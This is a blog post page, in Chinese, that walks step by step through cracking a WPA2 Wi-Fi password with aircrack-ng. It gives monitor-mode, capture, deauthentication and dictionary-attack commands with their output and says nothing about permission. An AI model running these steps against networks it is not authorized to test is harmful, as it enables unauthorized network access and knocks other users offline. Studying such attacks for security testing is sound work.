@@ -1,0 +1,473 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<!-- Head tag -->
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="description" content="XUranus的个人博客">
+    <meta name="keyword" content="XUranus">
+    <meta name="theme-color" content="#600090">
+    <meta name="msapplication-navbutton-color" content="#600090">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="#600090">
+    <link rel="shortcut icon" href="https://cdn4.iconfinder.com/data/icons/ionicons/512/icon-person-128.png">
+    <link rel="alternate" type="application/atom+xml" title="XUranus" href="/atom.xml">
+    <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/animate.css/3.5.2/animate.min.css">
+    <link rel="stylesheet" href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.css">
+    <title>
+        
+        aircrack-ng破解wifi密码｜真常应物,真常得性;常应常静,常清静矣
+        
+    </title>
+
+    <link rel="canonical" href="http://xuranus.github.io/2018/11/25/aircrack-ng破解wifi密码/">
+
+    <!-- Bootstrap Core CSS -->
+    
+<link rel="stylesheet" href="/css/bootstrap.min.css">
+
+
+    <!-- Custom CSS -->
+    
+<link rel="stylesheet" href="/css/blog-style.css">
+
+
+    <!-- Pygments Github CSS -->
+    
+<link rel="stylesheet" href="/css/syntax.css">
+
+<meta name="generator" content="Hexo 5.3.0"></head>
+
+<style>
+
+    header.intro-header {
+        background-image: url('https://timgsa.baidu.com/timg\?image\&amp;quality\=80\&amp;size\=b9999_10000\&amp;sec\=1539187381343\&amp;di\=2fa8911a94b7b5a904539a11c5192518\&amp;imgtype\=0\&amp;src\=http%3A%2F%2F1.im.guokr.com%2FXpmNucNdcod0EZA1xPbLj2Q1HkqyGs9xqvZUPkEf6YK8AgAAQAEAAFBO.png')
+    }
+</style>
+<!-- hack iOS CSS :active style -->
+<body ontouchstart="" class="animated fadeIn">
+<!-- Navigation -->
+<nav class="navbar navbar-default navbar-custom navbar-fixed-top " id="nav-top" data-ispost = "true" data-istags="false
+" data-ishome = "false" >
+    <div class="container-fluid">
+        <!-- Brand and toggle get grouped for better mobile display -->
+        <div class="navbar-header page-scroll">
+            <button type="button" class="navbar-toggle">
+                <span class="sr-only">Toggle navigation</span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+            </button>
+            <a class="navbar-brand animated pulse" href="/">
+                <span class="brand-logo">
+                    XUranus
+                </span>
+                's Blog
+            </a>
+        </div>
+
+        <!-- Collect the nav links, forms, and other content for toggling -->
+        <!-- Known Issue, found by Hux:
+            <nav>'s height woule be hold on by its content.
+            so, when navbar scale out, the <nav> will cover tags.
+            also mask any touch event of tags, unfortunately.
+        -->
+        <!-- /.navbar-collapse -->
+        <div id="huxblog_navbar">
+            <div class="navbar-collapse">
+                <ul class="nav navbar-nav navbar-right">
+                    <li>
+                        <a href="/">Home</a>
+                    </li>
+					
+                    
+                        
+							
+                        <li>
+                            <a href="/tags/">标签</a>
+                        </li>
+							
+						
+                    
+                        
+							
+                        <li>
+                            <a href="/works/">作品集</a>
+                        </li>
+							
+						
+                    
+                        
+							
+                        <li>
+                            <a href="/archives/">归档</a>
+                        </li>
+							
+						
+                    
+					
+					
+                </ul>
+            </div>
+        </div>
+    </div>
+    <!-- /.container -->
+</nav>
+<script>
+    // Drop Bootstarp low-performance Navbar
+    // Use customize navbar with high-quality material design animation
+    // in high-perf jank-free CSS3 implementation
+//    var $body   = document.body;
+    var $toggle = document.querySelector('.navbar-toggle');
+    var $navbar = document.querySelector('#huxblog_navbar');
+    var $collapse = document.querySelector('.navbar-collapse');
+
+    $toggle.addEventListener('click', handleMagic)
+    function handleMagic(e){
+        if ($navbar.className.indexOf('in') > 0) {
+        // CLOSE
+            $navbar.className = " ";
+            // wait until animation end.
+            setTimeout(function(){
+                // prevent frequently toggle
+                if($navbar.className.indexOf('in') < 0) {
+                    $collapse.style.height = "0px"
+                }
+            },400)
+        }else{
+        // OPEN
+            $collapse.style.height = "auto"
+            $navbar.className += " in";
+        }
+    }
+</script>
+
+<!-- Main Content -->
+
+<!--only post-->
+
+
+<img class="wechat-title-img"
+     src="https://timgsa.baidu.com/timg?image&quality=80&size=b9999_10000&sec=1603556028937&di=04f612199725ae5f775ae5cb456f9ae7&imgtype=0&src=http%3A%2F%2Fpix10.agoda.net%2Fgeo%2Fcity%2F17196%2F1_17196_02.jpg%3Fs%3D1920x822">
+
+
+<style>
+    
+    header.intro-header {
+        background-image: url('https://timgsa.baidu.com/timg?image&quality=80&size=b9999_10000&sec=1603556028937&di=04f612199725ae5f775ae5cb456f9ae7&imgtype=0&src=http%3A%2F%2Fpix10.agoda.net%2Fgeo%2Fcity%2F17196%2F1_17196_02.jpg%3Fs%3D1920x822')
+    }
+
+    
+</style>
+
+<header class="intro-header">
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1 text-center">
+                <div class="post-heading">
+                    <h1>aircrack-ng破解wifi密码</h1>
+                    
+                    <span class="meta">
+                         作者 XUranus
+                        <span>
+                          日期 2018-11-25
+                         </span>
+                    </span>
+                    <div class="tags text-center">
+                        
+                        <a class="tag" href="/tags/#网络安全"
+                           title="网络安全">网络安全</a>
+                        
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+    <div class="post-title-haojen">
+        <span>
+            aircrack-ng破解wifi密码
+        </span>
+    </div>
+</header>
+
+<!-- Post Content -->
+<article>
+    <div class="container">
+        <div class="row">
+            <!-- Post Container -->
+            <div class="col-lg-8 col-lg-offset-1 col-sm-9 post-container">
+                <blockquote>
+<p>环境：ArchLinux</p>
+</blockquote>
+<p>首先安装<code>aircrack-ng</code>:<code>sudo pacman -S aircrack-ng</code>,检测网卡是否支持监听<code>sudo airmon-ng</code>：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">PHY     Interface       Driver          Chipset</span><br><span class="line"></span><br><span class="line">phy0    wlp2s0          iwlwifi         Intel Corporation Wireless 8265 &#x2F; 8275 (rev 78)</span><br></pre></td></tr></table></figure>
+<p>可见我的无线网卡<code>wlp2s0</code>是支持监听的，如果该命令没有任何输出则表示没有可以支持监听模式的网卡。</p>
+<p>然后开启监听：<code>sudo airmon-ng start wlp2s0</code>,输入如下<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Found 2 processes that could cause trouble.</span><br><span class="line">Kill them using &#39;airmon-ng check kill&#39; before putting</span><br><span class="line">the card in monitor mode, they will interfere by changing channels</span><br><span class="line">and sometimes putting the interface back in managed mode</span><br><span class="line"></span><br><span class="line">  PID Name</span><br><span class="line">  420 NetworkManager</span><br><span class="line">  433 wpa_supplicant</span><br><span class="line"></span><br><span class="line">PHY     Interface       Driver          Chipset</span><br><span class="line"></span><br><span class="line">phy0    wlp2s0          iwlwifi         Intel Corporation Wireless 8265 &#x2F; 8275 (rev 78)</span><br><span class="line"></span><br><span class="line">                (mac80211 monitor mode vif enabled for [phy0]wlp2s0 on [phy0]wlp2s0mon)</span><br><span class="line">                (mac80211 station mode vif disabled for [phy0]wlp2s0)</span><br></pre></td></tr></table></figure><br>上述信息告知了一些可能影响破解的进程，最好杀掉，否则可能会在抓包时卡死或者导致抓不到握手包。<code>ifconfig</code>查看，此时<code>wlp2s0</code>变成了<code>wlp2s0mon</code><br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">lo: flags&#x3D;73&lt;UP,LOOPBACK,RUNNING&gt;  mtu 65536</span><br><span class="line">        inet 127.0.0.1  netmask 255.0.0.0</span><br><span class="line">        inet6 ::1  prefixlen 128  scopeid 0x10&lt;host&gt;</span><br><span class="line">        loop  txqueuelen 1000  (Local Loopback)</span><br><span class="line">        RX packets 1252  bytes 104572 (102.1 KiB)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 1252  bytes 104572 (102.1 KiB)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br><span class="line"></span><br><span class="line">wlp2s0mon: flags&#x3D;4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500</span><br><span class="line">        unspec D4-25-8B-DF-47-C9-3A-30-00-00-00-00-00-00-00-00  txqueuelen 1000  (UNSPEC)</span><br><span class="line">        RX packets 268  bytes 35064 (34.2 KiB)</span><br><span class="line">        RX errors 0  dropped 268  overruns 0  frame 0</span><br><span class="line">        TX packets 0  bytes 0 (0.0 B)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br></pre></td></tr></table></figure><br>开始搜索周围的网络<code>sudo airodump-ng wlp2s0mon</code>,显示如下：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">CH  6 ][ Elapsed: 48 s ][ 2018-11-25 14:42 ][ WPA handshake: E6:46:DA:CC:74:1E                                         </span><br><span class="line">                                                                                                                                                            </span><br><span class="line">BSSID              PWR  Beacons    #Data, #&#x2F;s  CH  MB   ENC  CIPHER AUTH ESSID</span><br><span class="line"></span><br><span class="line">E6:46:DA:DC:DC:68  -58       20        1    0   6  180  WPA2 CCMP   PSK  Looper                                                                               </span><br><span class="line">4E:0B:BE:02:02:CF  -54       24        0    0   1  130  WPA2 CCMP   PSK  DIRECT-CSDESKTOP-G8VIQD6mstL                                </span><br><span class="line">BC:3D:85:E3:6A:2D  -54       32       20    0  11  130  WPA2 CCMP   PSK  Pyramid                                                                            </span><br><span class="line">B0:EB:57:7E:56:CA  -56       36        0    0   1  135  OPN              Honor V10                   </span><br><span class="line">E6:46:DA:DC:DC:68  -58       20        1    0   6  180  WPA2 CCMP   PSK  Looper                                                                               </span><br></pre></td></tr></table></figure>
+<p>使用该命令列出无线网卡扫描到的WiFi热点详细信息，包括信号强度，加密类型，信道等。这里我们记下要破解WiFi的BSSID和信道，当搜索到我们想要破解的WiFi热点时可以 Ctrl+C 停止搜索。</p>
+<p>使用网卡的监听模式抓取周围的无线网络数据包，其中我们需要用到的数据包是包含了WiFi密码的握手包，当有新用户连接WiFi时会发送握手包。当我要抓取上述第一个wifi热点的包，命令如下：</p>
+<p><code>sudo airodump-ng -c 6 --bssid E6:46:DA:DC:DC:68 -w ~/caps wlp2s0mon</code></p>
+<p><code>-c</code>,<code>--bssid</code>,<code>-w</code>分别指定了信道，bssid，握手包存储目录。显示如下。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">CH  6 ][ Elapsed: 5 mins ][ 2018-11-25 15:00                                                                                                                                                                                                    </span><br><span class="line">BSSID              PWR RXQ  Beacons    #Data, #&#x2F;s  CH  MB   ENC  CIPHER AUTH ESSID                                                                               E6:46:DA:DC:DC:68  -55   0       90     1382    9   6  180  WPA2 CCMP   PSK  Looper</span><br><span class="line"></span><br><span class="line">BSSID              STATION            PWR   Rate    Lost    Frames  Probe                                                                                    E6:46:DA:DC:DC:68  5C:5F:67:1E:F3:48  -51    0e- 6e     2     2051</span><br></pre></td></tr></table></figure>
+<p>现在我们使用<code>aireplay-ng</code>命令给已连接的设备发送一个反认证包，使该设备强制断开连接，随后它会自动再次连接wifi。 不难看出，<code>airplay-ng</code>生效的前提是WiFi热点中必须至少已经接入一个设备。<br>由于刚刚打开的终端一直在执行抓包工作，所以我们重新打开一个终端，输入命令。</p>
+<p><code>sudo aireplay-ng -0 2 -a E6:46:DA:DC:DC:68 -c  5C:5F:67:1E:F3:48  wlp2s0mon</code></p>
+<p>-a后接wifi的SSID，-c接被攻击的设备的SSID</p>
+<p>此时静待抓包窗口抓到握手包，捕获后会有提示，<code>Ctrl+C</code>命令停止抓包，同时结束无线网卡的监听模式:</p>
+<p><code>sudo airmon-ng stop wlp2s0mon</code></p>
+<p>最后将握手包中的密码和字典密码匹配：</p>
+<p><code>sudo aircrack-ng -a2 -b E6:46:DA:DC:DC:68 -w ～/dic.txt ~/caps/*.cap</code></p>
+<p>成功显示如下：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[00:00:00] 1&#x2F;0 keys tested (173.10 k&#x2F;s) </span><br><span class="line"></span><br><span class="line">      Time left: </span><br><span class="line"></span><br><span class="line">                           KEY FOUND! [ 425670389 ]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">      Master Key     : 9E DC BD 2E 3C 46 3E A5 0D 43 60 BD 7D DD 86 10 </span><br><span class="line">                       59 5C 11 30 77 92 07 D6 9D 26 AF CB 2C 09 AB 62 </span><br><span class="line"></span><br><span class="line">      Transient Key  : 68 80 65 67 78 1C 0F 40 F9 81 3B 07 47 C1 34 BC </span><br><span class="line">                       49 09 61 18 D7 1F C2 55 3B F1 73 F9 FD 7B 18 FC </span><br><span class="line">                       93 B0 63 C8 23 0C D0 EE 72 A8 8C 1F EF 54 72 01 </span><br><span class="line">                       98 EB 1B 40 07 25 1B A5 86 CF E6 66 0F 33 35 FF </span><br><span class="line"></span><br><span class="line">      EAPOL HMAC     : 43 93 FF 24 90 07 07 F8 B5 58 D6 DA 2B 1E AF 32 </span><br><span class="line"></span><br></pre></td></tr></table></figure><br>最后为了保证网络正常使用，重启networkManager服务，<code>sudo systemctl start NetworkManager</code></p>
+
+                <hr>
+                
+
+                <ul class="pager">
+                    
+                    <li class="previous">
+                        <a href="/2018/11/26/hexo中开启对Mathjax的支持/" data-toggle="tooltip" data-placement="top"
+                           title="hexo中开启对Mathjax的支持">&larr; Previous Post</a>
+                    </li>
+                    
+                    
+                    <li class="next">
+                        <a href="/2018/11/24/密码学原理/" data-toggle="tooltip" data-placement="top"
+                           title="密码学原理">Next Post &rarr;</a>
+                    </li>
+                    
+                </ul>
+
+                
+
+                
+                <!-- disqus 评论框 start -->
+                <div class="comment">
+                    <div id="disqus_thread" class="disqus-thread"></div>
+                </div>
+                <!-- disqus 评论框 end -->
+                
+
+
+                <!--加入新的评论系统-->
+                
+
+                
+
+            </div>
+
+            <div class="hidden-xs col-sm-3 toc-col">
+                <div class="toc-wrap">
+                    
+                </div>
+            </div>
+        </div>
+
+        <div class="row">
+            <!-- Sidebar Container -->
+
+            <div class="
+                col-lg-8 col-lg-offset-2
+                col-md-10 col-md-offset-1
+                sidebar-container">
+
+                <!-- Featured Tags -->
+                
+                <section>
+                    <!-- no hr -->
+                    <h5 class="text-center">
+                        <a href="/tags/">FEATURED TAGS</a>
+                    </h5>
+                    <div class="tags">
+                        
+                        <a class="tag" href="/tags/#网络安全"
+                           title="网络安全">网络安全</a>
+                        
+                    </div>
+                </section>
+                
+
+                <!-- Friends Blog -->
+                
+                <div style="margin-top: 20px;">
+                    <h5 class="text-center">FRIENDS</h5>
+                    <ul class="list-inline text-center">
+                        
+                        <li><a target="_blank" rel="noopener" href="https://whoisnian.com">Whoisnian</a></li>
+                        
+                        <li><a target="_blank" rel="noopener" href="https://thankod.github.io/">thankod</a></li>
+                        
+                        <li><a target="_blank" rel="noopener" href="https://void-shana.moe/">VOID001</a></li>
+                        
+                        <li><a target="_blank" rel="noopener" href="https://haizs.com/">Haizs</a></li>
+                        
+                        <li><a target="_blank" rel="noopener" href="https://backgulf.com/">Backgulf</a></li>
+                        
+                    </ul>
+                </div>
+                
+            </div>
+        </div>
+
+    </div>
+</article>
+
+
+
+<!-- disqus 公共JS代码 start (一个网页只需插入一次) -->
+<script type="text/javascript">
+    /* * * CONFIGURATION VARIABLES * * */
+    var disqus_shortname = "XUranus";
+    var disqus_identifier = "http://xuranus.github.io/2018/11/25/aircrack-ng%E7%A0%B4%E8%A7%A3wifi%E5%AF%86%E7%A0%81/";
+    var disqus_url = "http://xuranus.github.io/2018/11/25/aircrack-ng%E7%A0%B4%E8%A7%A3wifi%E5%AF%86%E7%A0%81/";
+
+    (function () {
+        var dsq = document.createElement('script');
+        dsq.type = 'text/javascript';
+        dsq.async = true;
+        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    })();
+</script>
+<!-- disqus 公共JS代码 end -->
+
+
+
+
+
+<!-- Footer -->
+<!-- Footer -->
+<footer>
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1 text-center">
+                <br>
+                <ul class="list-inline text-center">
+                
+                
+                
+                    <li>
+                        <a target="_blank" href="https://www.zhihu.com/people/wang-xing-xiao-99">
+                            <span class="fa-stack fa-lg">
+                                <i class="fa fa-circle fa-stack-2x"></i>
+                                <i class="fa  fa-stack-1x fa-inverse">知</i>
+                            </span>
+                        </a>
+                    </li>
+                
+
+                
+                    <li>
+                        <a target="_blank" href="http://weibo.com/WXingxiao">
+                            <span class="fa-stack fa-lg">
+                                <i class="fa fa-circle fa-stack-2x"></i>
+                                <i class="fa fa-weibo fa-stack-1x fa-inverse"></i>
+                            </span>
+                        </a>
+                    </li>
+                
+
+                
+
+                
+                    <li>
+                        <a target="_blank"  href="https://github.com/XUranus">
+                            <span class="fa-stack fa-lg">
+                                <i class="fa fa-circle fa-stack-2x"></i>
+                                <i class="fa fa-github fa-stack-1x fa-inverse"></i>
+                            </span>
+                        </a>
+                    </li>
+                
+
+                
+
+                </ul>
+                <p class="copyright text-muted">
+                    Copyright &copy; XUranus 2021
+                    <br>
+                    <span id="busuanzi_container_site_pv" style="font-size: 12px;">PV: <span id="busuanzi_value_site_pv"></span> Times</span>
+                    <br>
+                    Theme by <a target="_blank" rel="noopener" href="https://haojen.github.io/">Haojen Ma</a>
+                </p>
+
+            </div>
+        </div>
+    </div>
+</footer>
+
+<!-- jQuery -->
+
+<script src="/js/jquery.min.js"></script>
+
+
+<!-- Bootstrap Core JavaScript -->
+
+<script src="/js/bootstrap.min.js"></script>
+
+
+<!-- Custom Theme JavaScript -->
+
+<script src="/js/blog.js"></script>
+
+
+<!-- async load function -->
+<script>
+    function async(u, c) {
+      var d = document, t = 'script',
+          o = d.createElement(t),
+          s = d.getElementsByTagName(t)[0];
+      o.src = u;
+      if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
+      s.parentNode.insertBefore(o, s);
+    }
+</script>
+
+<!-- jquery.tagcloud.js -->
+<script>
+    // only load tagcloud.js in tag.html
+    if($('#tag_cloud').length !== 0){
+        async("http://xuranus.github.io/js/jquery.tagcloud.js",function(){
+            $.fn.tagcloud.defaults = {
+                //size: {start: 1, end: 1, unit: 'em'},
+                color: {start: '#bbbbee', end: '#0085a1'},
+            };
+            $('#tag_cloud a').tagcloud();
+        })
+    }
+</script>
+
+<!--fastClick.js -->
+<script>
+    async("//cdn.bootcss.com/fastclick/1.0.6/fastclick.min.js", function(){
+        var $nav = document.querySelector("nav");
+        if($nav) FastClick.attach($nav);
+    })
+</script>
+
+
+
+<!-- Google Analytics -->
+
+
+
+<!-- Baidu Tongji -->
+
+
+<!-- swiftype -->
+<script type="text/javascript">
+  (function(w,d,t,u,n,s,e){w['SwiftypeObject']=n;w[n]=w[n]||function(){
+  (w[n].q=w[n].q||[]).push(arguments);};s=d.createElement(t);
+  e=d.getElementsByTagName(t)[0];s.async=1;s.src=u;e.parentNode.insertBefore(s,e);
+  })(window,document,'script','//s.swiftypecdn.com/install/v2/st.js','_st');
+
+  _st('install','','2.0.0');
+</script>
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+<!--wechat title img-->
+<img class="wechat-title-img" src="https://timgsa.baidu.com/timg?image&amp;quality=80&amp;size=b9999_10000&amp;sec=1539187847049&amp;di=1446fff8f41c349c7cd72af34d44c2ab&amp;imgtype=0&amp;src=http%3A%2F%2Fwww.ewell.com.cn%2Feditor%2Fattached%2Fimage%2F20171225%2F20171225110887508750.jpg">
+</body>
+
+</html>
